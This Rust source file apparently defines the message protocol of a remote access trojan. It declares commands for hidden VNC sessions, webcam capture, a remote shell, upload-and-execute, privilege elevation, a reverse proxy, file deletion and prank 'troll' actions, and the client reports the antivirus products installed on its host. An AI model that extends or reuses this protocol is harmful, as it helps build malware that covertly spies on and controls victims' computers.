use rmp_serde::{Deserializer, Serializer};
use serde::{Deserialize, Serialize};

#[derive(Debug, PartialEq, Clone, Deserialize, Serialize)]
pub struct ClientInfo {
    pub uuidv4: Option<String>,
    pub addr: Option<String>,
    pub group: String,
    pub username: String,
    pub hostname: String,
    pub os: String,
    pub ram: String,
    pub cpu: String,
    pub gpus: Vec<String>,
    pub storage: Vec<String>,
    pub displays: i32,
    pub disconnected: Option<bool>,
    pub is_elevated: bool,
    pub reverse_proxy_port: String,
    pub installed_avs: Vec<String>,
    pub country_code: String,
}

pub trait Packet {
    fn serialized(&self) -> Vec<u8>;
    fn deserialized(buf: &[u8]) -> Result<(Self, &[u8]), rmp_serde::decode::Error>
    where
        Self: std::marker::Sized;
    fn get_type(&self) -> &'static str;
}

/// Packets going from client to the server.
#[derive(Debug, PartialEq, Serialize, Deserialize, Clone)]
pub enum ServerboundPacket {
    EncryptionRequest,
    EncryptionConfirm(Vec<u8>, Vec<u8>), // encrypted secret and token
    ClientInfo(ClientInfo),
    ScreenshotResult(ScreenshotData),
    WebcamResult(Vec<u8>),
    RemoteDesktopFrame(RemoteDesktopFrame),
    ProcessList(ProcessList),
    ShellOutput(String),

    DonwloadFileResult(FileData),

    DisksResult(Vec<String>),
    FileList(Vec<File>),
    CurrentFolder(String),   

    HVNCFrame(Vec<u8>),
}

impl Packet for ServerboundPacket {
    fn serialized(&self) -> Vec<u8> {
        let mut buf = Vec::new();
        self.serialize(&mut Serializer::new(&mut buf)).unwrap();
        buf
    }

    fn deserialized(buf: &[u8]) -> Result<(Self, &[u8]), rmp_serde::decode::Error> {
        let mut d = Deserializer::new(buf);
        Self::deserialize(&mut d).map(|p| (p, d.into_inner()))
    }

    fn get_type(&self) -> &'static str {
        match self {
            ServerboundPacket::EncryptionRequest => "Encryption Request",
            ServerboundPacket::EncryptionConfirm(_, _) => "Encryption Confirm",
            ServerboundPacket::ClientInfo(_) => "Client Info",
            ServerboundPacket::ScreenshotResult(_) => "Screenshot Result",
            ServerboundPacket::WebcamResult(_) => "Webcam Result",
            ServerboundPacket::RemoteDesktopFrame(_) => "Remote Desktop Frame",
            ServerboundPacket::ProcessList(_) => "Process List",
            ServerboundPacket::ShellOutput(_) => "Shell Output",
            ServerboundPacket::DonwloadFileResult(_) => "Donwload File Result",
            ServerboundPacket::DisksResult(_) => "Disks Result",
            ServerboundPacket::FileList(_) => "File List",
            ServerboundPacket::CurrentFolder(_) => "Current Folder",
            ServerboundPacket::HVNCFrame(_) => "HVNC Frame",
        }
    }
}

/// Packets going from the server to client.
#[derive(Debug, PartialEq, Eq, Serialize, Deserialize, Clone)]
pub enum ClientboundPacket {
    CloseClientSession,
    EncryptionResponse(Vec<u8>, Vec<u8>), // channel's public key and token
    EncryptionAck,
    InitClient,
    ScreenshotDisplay(String),
    RequestWebcam,
    Reconnect,
    Disconnect,
    StartRemoteDesktop(RemoteDesktopConfig),
    StopRemoteDesktop,
    MouseClick(MouseClickData),
    KeyboardInput(KeyboardInputData),
    VisitWebsite(VisitWebsiteData),
    ShowMessageBox(MessageBoxData),
    ElevateClient,
    ManageSystem(String),

    GetProcessList,
    KillProcess(Process),
    SuspendProcess(Process),
    ResumeProcess(Process),
    StartProcess(String),

    StartShell,
    ExitShell,
    ShellCommand(String),


    ViewDir(String),
    PreviousDir,
    RemoveDir(String),
    RemoveFile(String),
    DownloadFile(String),
    AvailableDisks,

    StartReverseProxy(String),
    StopReverseProxy,

    StartHVNC,
    StopHVNC,
    OpenExplorer,
    
    UploadAndExecute(FileData),
    ExecuteFile(String),
    UploadFile(String, FileData),

    TrollClient(TrollCommand),
}

impl Packet for ClientboundPacket {
    fn serialized(&self) -> Vec<u8> {
        let mut buf = Vec::new();
        self.serialize(&mut Serializer::new(&mut buf)).unwrap();
        buf
    }

    fn deserialized(buf: &[u8]) -> Result<(Self, &[u8]), rmp_serde::decode::Error> {
        let mut d = Deserializer::new(buf);
        Self::deserialize(&mut d).map(|p| (p, d.into_inner()))
    }

    fn get_type(&self) -> &'static str {
        match self {
            ClientboundPacket::CloseClientSession => "Close Client Session",
            ClientboundPacket::EncryptionResponse(_, _) => "Encryption Response",
            ClientboundPacket::EncryptionAck => "Encryption Ack",
            ClientboundPacket::InitClient => "Init Client",
            ClientboundPacket::ScreenshotDisplay(_) => "Screenshot Display",
            ClientboundPacket::RequestWebcam => "Request Webcam",
            ClientboundPacket::Reconnect => "Reconnect",
            ClientboundPacket::Disconnect => "Disconnect",
            ClientboundPacket::StartRemoteDesktop(_) => "Start Remote Desktop",
            ClientboundPacket::StopRemoteDesktop => "Stop Remote Desktop",
            ClientboundPacket::MouseClick(_) => "Mouse Click",
            ClientboundPacket::KeyboardInput(_) => "Keyboard Input",
            ClientboundPacket::VisitWebsite(_) => "Visit Website",
            ClientboundPacket::ShowMessageBox(_) => "Show MessageBox",
            ClientboundPacket::ElevateClient => "Elevate Client",
            ClientboundPacket::ManageSystem(_) => "Manage System",
            ClientboundPacket::GetProcessList => "Get Process List",
            ClientboundPacket::KillProcess(_) => "Kill Process",
            ClientboundPacket::SuspendProcess(_) => "Suspend Process",
            ClientboundPacket::ResumeProcess(_) => "Resume Process",
            ClientboundPacket::StartProcess(_) => "Start Process",
            ClientboundPacket::StartShell => "Start Shell",
            ClientboundPacket::ExitShell => "Exit Shell",
            ClientboundPacket::ShellCommand(_) => "Shell Command",

            ClientboundPacket::ViewDir(_) => "View Dir",
            ClientboundPacket::PreviousDir => "Previous Dir",
            ClientboundPacket::RemoveDir(_) => "Remove Dir",
            ClientboundPacket::RemoveFile(_) => "Remove File",
            ClientboundPacket::DownloadFile(_) => "Download File",
            ClientboundPacket::AvailableDisks => "Available Disks",

            ClientboundPacket::StartReverseProxy(_) => "Start Reverse Proxy",
            ClientboundPacket::StopReverseProxy => "Stop Reverse Proxy",

            ClientboundPacket::StartHVNC => "Start HVNC",
            ClientboundPacket::StopHVNC => "Stop HVNC",
            ClientboundPacket::OpenExplorer => "Open Explorer",
            ClientboundPacket::UploadAndExecute(_) => "Upload And Execute",
            ClientboundPacket::ExecuteFile(_) => "Execute File",
            ClientboundPacket::UploadFile(_, _) => "Upload File",
            ClientboundPacket::TrollClient(_) => "Troll Client",
        }
    }
}

#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
pub struct RemoteDesktopConfig {
    pub display: i32,
    pub quality: u8,   // JPEG compression quality (1-100)
    pub fps: u8,       // Target frames per second
}

#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
pub struct RemoteDesktopFrame {
    pub timestamp: u64,
    pub display: i32,
    pub data: Vec<u8>, // JPEG encoded image data
    pub width: usize,
    pub height: usize,
}

#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
pub struct MouseClickData {
    pub click_type: i32,  // 0 for left, 1 for middle, 2 for right, 3 for scroll
    pub display: i32,
    pub x: i32,
    pub y: i32,
    pub action_type: i32, // 0 for click (down+up), 1 for mouse down, 2 for mouse up, 3 for mouse move during drag, 4 for scroll up, 5 for scroll down
    pub scroll_amount: i32, // Amount to scroll (only used when click_type is 3)
}

#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
pub struct VisitWebsiteData {
    pub visit_type: String,
    pub url: String,
}

#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
pub struct MessageBoxData {
    pub title: String,
    pub message: String,
    pub button: String,
    pub icon: String,
}

#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
pub struct ProcessList {
    pub processes: Vec<Process>,
}

#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
pub struct Process {
    pub pid: usize,
    pub name: String,
}

#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
pub struct File {
    pub file_type: String,
    pub name: String,
}

#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
pub struct FileData {
    pub name: String,
    pub data: Vec<u8>,
}

#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
pub struct KeyboardInputData {
    pub key_code: u32,       // Virtual key code
    pub character: String,   // Printable character
    pub is_keydown: bool,    // True for key down, false for key up
    pub shift_pressed: bool, // Shift modifier state
    pub ctrl_pressed: bool,  // Ctrl modifier state
    pub caps_lock: bool,     // Caps lock state
}

#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
pub struct ScreenshotData {
    pub width: u32,
    pub height: u32,
    pub data: Vec<u8>,
}

#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
#[serde(tag = "type", content = "payload")]
pub enum TrollCommand {
    HideDesktop(String),
    ShowDesktop(String),
    HideTaskbar(String),
    ShowTaskbar(String),
    HideNotify(String),
    ShowNotify(String),
    FocusDesktop(String),
    EmptyTrash(String),
    RevertMouse(String),
    NormalMouse(String),
    MonitorOff(String),
    MonitorOn(String),
    MaxVolume(String),
    MinVolume(String),
    MuteVolume(String),
    UnmuteVolume(String),
    SpeakText(String),
    Beep(String),
    PianoKey(String),
}

